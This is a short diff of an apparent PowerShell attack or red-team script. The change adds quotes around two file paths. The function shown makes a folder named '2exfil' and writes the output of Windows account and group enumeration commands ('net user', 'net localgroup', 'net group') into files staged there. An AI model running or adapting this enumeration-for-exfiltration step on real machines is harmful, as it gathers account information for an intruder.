@@ -14,8 +14,8 @@ function gs1{
 
 function ks1{
     mkdir c:\temp\2exfil
-    $dog = c:\temp\2exfil\AccountInfo.txt
-    $dog2 = c:\temp\2exfil\NetworkInfo.txt
+    $dog = "c:\temp\2exfil\AccountInfo.txt"
+    $dog2 = "c:\temp\2exfil\NetworkInfo.txt"
     net user >> $dog
     net localgroup >> $dog
     net group >> $dog
